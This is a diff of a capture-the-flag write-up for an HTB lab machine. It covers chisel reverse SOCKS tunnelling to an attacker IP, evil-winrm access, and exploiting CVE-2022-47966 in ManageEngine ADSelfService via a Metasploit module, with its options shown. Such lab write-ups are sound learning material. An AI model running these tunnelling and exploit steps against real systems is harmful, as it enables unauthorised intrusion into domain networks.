@@ -369,7 +369,7 @@ chisel server -p 9001 --reverse
 
 Then we can `evil-winrm` in.
 
-<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1) (4).png" alt=""><figcaption></figcaption></figure>
 
 We can now capture the user flag!
 
@@ -430,11 +430,12 @@ Active Connections
   TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING
   TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
   TCP    0.0.0.0:8888           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:9003           0.0.0.0:0              LISTENING
   TCP    0.0.0.0:9251           0.0.0.0:0              LISTENING
   TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING
 ```
 
-Let's try port forwarding to view the services running on these ports. We would have to port forward again using `chisel` to do this. Take&#x20;
+Port 9003 is the one we want after some testing. Port 8888 redirects me there for some reason and the rest of the ports weren't interesting. Let's try port forwarding to view the services running on these ports. We would have to port forward again using `chisel` to do this.&#x20;
 
 ```bash
 # on my machine, with proxychains set up to port 1080
@@ -443,7 +444,7 @@ Let's try port forwarding to view the services running on these ports. We would 
 ./chisel client 10.10.16.18:9003 R:1080:socks
 ```
 
-We need to add `DC.cerberus.local` with the IP of `172.16.22.1` to our `/etc/hosts` file before we can visit this in Firefox with proxychains. When visiting port 8888, we get redirected to the AD login page. Very similar to NUS's, interestingly.&#x20;
+Then we need to add `DC.cerberus.local` with the IP of `172.16.22.1` to our `/etc/hosts` file before we can visit this in Firefox with `proxychains`. Very similar to NUS's, interestingly.&#x20;
 
 <figure><img src="../../.gitbook/assets/image (5) (1) (4).png" alt=""><figcaption></figcaption></figure>
 
@@ -461,7 +462,7 @@ One thing I've learnt with the newer HTB machines is that **they always use newe
 
 {% embed url="https://www.cvedetails.com/vulnerability-list/vendor_id-9841/product_id-20523/Zohocorp-Manageengine-Adselfservice-Plus.html" %}
 
-The first was CVE-2022-47966, which was an Exec Code exploit. It seems to affect a huge number of versions, so it might work. This particular exploit requires SAML SSO to be enabled, and it is on this website. The following link is visited when we first load the page before logging in:
+The first was CVE-2022-47966, which was an Exec Code exploit. It seems to affect a huge number of versions based on reading some articles, so it might work. This particular exploit requires SAML SSO to be enabled, and it is on this website as the following link is visited when we first load the page before logging in:
 
 {% code overflow="wrap" %}
 ```
@@ -473,7 +474,7 @@ I took a hint from the HTB forum, and it seems `metasploit` is the easiest way t
 
 {% embed url="https://github.com/rapid7/metasploit-framework/pull/17527" %}
 
-Either that or we can update `metasploit` and access the module via `use exploit/multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966`. Looking at the options, the main ones to set are **GUID and ISSUER\_URL.** The GUID must be the string we got after logging in. Based on the definition of the issuer URL, we can find it quite easily by googling SAML SSO identity provider. We can set the options below:
+Either import the module or we can update `metasploit` and access the module via `use exploit/multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966`. Looking at the options, the main ones to set are **GUID and ISSUER\_URL.** The GUID must be the string we got after logging in. Based on the definition of the issuer URL, we can find it quite easily by googling SAML SSO identity provider. We can set the options below:
 
 ```
 set RHOSTS 172.16.22.1
@@ -492,7 +493,7 @@ Using hints from the forum were really helpful, because I dislike using Metasplo
 
 ## Beyond Root
 
-I feel that I should delve into a bit on how the exploit works since Metasploit is a black box after all. So this exploit only affects websites with SAML installed. This vulnerability arises from an outdated dependency on Apache Santuario, which it self is vulnerable to RCE dating back to 2008.
+I feel that I should delve into a bit on how the exploit works since Metasploit is a black box after all. This vulnerability arises from an outdated dependency on Apache Santuario, which it self is vulnerable to RCE dating back to 2008.
 
 I would try to explain the exploit, but the report itself does a way better job than I ever can. Check it out!
 
